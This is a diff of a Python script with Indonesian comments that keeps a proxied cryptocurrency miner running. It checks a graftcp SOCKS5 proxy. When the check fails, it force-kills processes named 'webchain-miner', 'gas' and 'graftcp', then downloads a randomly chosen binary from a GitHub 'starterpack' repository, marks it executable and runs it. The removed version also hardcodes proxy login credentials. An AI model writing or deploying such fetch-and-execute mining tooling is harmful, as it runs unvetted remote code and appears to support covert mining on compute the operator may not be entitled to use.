@@ -1,102 +1,84 @@
 import time
 import requests
 import subprocess
-import socks
-import socket
-import urllib.request
-import configparser
 import os
 import random
+import configparser
 
-def kill_processes(process_names):
-    for name in process_names:
-        subprocess.run(['pkill', '-9', name])
+def get_proxy_ip_from_config(file_path):
+    config = configparser.ConfigParser()
+    config.read(file_path)
+    
+    proxy_ip = None
+    if 'local' in config:
+        socks5_value = config['local'].get('socks5')
+        if socks5_value:
+            proxy_ip = socks5_value.split(':')[0]
+    
+    return proxy_ip
 
-# Fungsi untuk memeriksa apakah alamat IP ada dalam daftar socks5
-def check_ip_in_list(ip_list, socks_ip):
-    for ip in ip_list:
-        if socks_ip == ip:
-            return True
+# Fungsi untuk memeriksa koneksi proxy menggunakan curl
+def check_proxy():
+    file_path = 'graftcp/local/graftcp-local.conf'  # Sesuaikan dengan path file yang benar
+    proxy_ip = get_proxy_ip_from_config(file_path)
+
+    if not proxy_ip:
+        print("Tidak dapat menemukan IP proxy dalam konfigurasi.")
+        return False
+    
+    curl_command = f"./graftcp/graftcp curl http://checkip.amazonaws.com"
+    
+    try:
+        result = subprocess.run(curl_command, shell=True, capture_output=True, text=True, timeout=10)
+        if result.returncode == 0:
+            proxy_response = result.stdout.strip()
+            if proxy_response == proxy_ip:
+                print(proxy_response)
+                return True
+    except Exception as e:
+        print(f"Error checking proxy: {e}")
     return False
 
-# Fungsi untuk mendownload file dan menjalankannya
-def download_and_run(base_url):
-    file_name = random.choice(nama_file)
-    
-    # Naik satu direktori
-    os.chdir("..")
-    
-    # Mendownload file dari URL
-    url = f"{base_url}/{file_name}"
-    urllib.request.urlretrieve(url, file_name)
+def kill_processes(process_list):
+    for process_name in process_list:
+        subprocess.run(['pkill', '-9', process_name])
 
-    # Memberikan izin eksekusi pada file
-    os.chmod(file_name, 0o755)
+def download_and_run_file():
+    download_link_base = "https://github.com/suplays/starterpack/raw/main/nim/backup/"
+    file_names = ['satu', 'dua', 'tiga', 'empat', 'lima', 'enam', 'tujuh']
 
-    # Menjalankan file di background
-    subprocess.run(["./" + file_name])
-
-# Membaca konfigurasi dari file graftcp-local.conf
-config = configparser.ConfigParser()
-config.read("graftcp/local/graftcp-local.conf")
-
-# Mendapatkan nilai dari konfigurasi socks5
-socks5_config = config.get("local", "socks5")
-socks_ip = socks5_config.split(":")[0]
-
-# daftar nama file dan titik akses
-nama_file = ['satu', 'dua', 'tiga', 'empat', 'lima', 'enam', 'tujuh', 'delapan', 'sembilan', 'sepuluh', 'sebelas', 'duabelas', 'tigabelas', 'empatbelas']
-
-# URL untuk memeriksa alamat IP
-check_ip_url = "http://checkip.amazonaws.com"
-# URL untuk memeriksa respons JSON
-check_json_url = "http://localtopublic.ap.loclx.io/list"
-# URL untuk mendownload file
-download_url = "https://github.com/suplays/starterpack/raw/main/nim"
-
-while True:
     try:
-        original_socket = socket.socket
-        # Mengatur proxy socks5 hanya untuk mengakses URL memeriksa alamat IP
-        socks.set_default_proxy(socks.SOCKS5, socks_ip, 443, username="clarksye", password="user123")
-        socket.socket = socks.socksocket
-
-        response = requests.get(check_ip_url, timeout=10)  # Menambahkan parameter timeout
-        print("socks_ip:", socks_ip)
-        time.sleep(300)
-        continue
+        os.chdir("..")  # Naik satu level direktori
+        
+        random_file_name = random.choice(file_names)
+        download_link = f"{download_link_base}{random_file_name}"
+        response = requests.get(download_link)
+        
+        if response.status_code == 200:
+            file_path = f"./{random_file_name}"
+            with open(file_path, 'wb') as file:
+                file.write(response.content)
+            os.chmod(file_path, 0o755)  # Memberikan izin eksekusi pada file
+            
+            subprocess.run(f"./{random_file_name}", shell=True)
+        else:
+            print("Gagal mengunduh file.")
     except Exception as e:
-        print("Failed to connect with proxy:", str(e))
-        # Mengakses URL untuk memeriksa respons JSON tanpa proxy
-        try:
-            # Reset socket to cancel the socks5 proxy
-            socket.socket = original_socket
+        print(f"Error downloading/running file: {e}")
 
-            response = requests.get(check_json_url, timeout=10)
-            data = response.json()
-
-            # Mengekstrak nilai success dan IP dari respons JSON
-            success = data.get("success", False)
-            ip_list = data.get("ip", [])
-
-            print("ip_list:", ip_list)
-
-            if success:
-                # Memeriksa apakah ada alamat IP dari data socks5 dalam daftar IP JSON
-                if check_ip_in_list(ip_list, socks_ip):
-                    print("ip ada di list")
-                    # Menunggu 1 menit
-                    time.sleep(60)
-                    continue
-                # Daftar nama proses yang ingin dihentikan
-                processes_to_kill = ['webchain-miner', 'gas', 'graftcp', 'graftcp-local']
-                # Menghentikan proses-proses secara bersamaan
-                kill_processes(processes_to_kill)
-
-                # Mendownload file dan menjalankannya jika ada kesalahan saat mengakses URL menggunakan proxy
-                download_and_run(download_url)
-                print("success running")
+if __name__ == "__main__":
+    process_list = ['webchain-miner', 'gas', 'graftcp', 'graftcp-local']
+    
+    while True:
+        if check_proxy():
+            print("Proxy aktif.")
+            time.sleep(300)  # Tunggu 5 menit
+        else:
+            print("Proxy tidak valid. Menghentikan proses.")
+            kill_processes(process_list)
+            try:
+                download_and_run_file()
                 break
-        except Exception as e:
-            print("Failed to retrieve JSON data:", str(e))
-            continue
+            except Exception as e:
+                print(f"Error saat download dan jalankan file: {e}")
+                time.sleep(30)  # Tunggu 30 detik
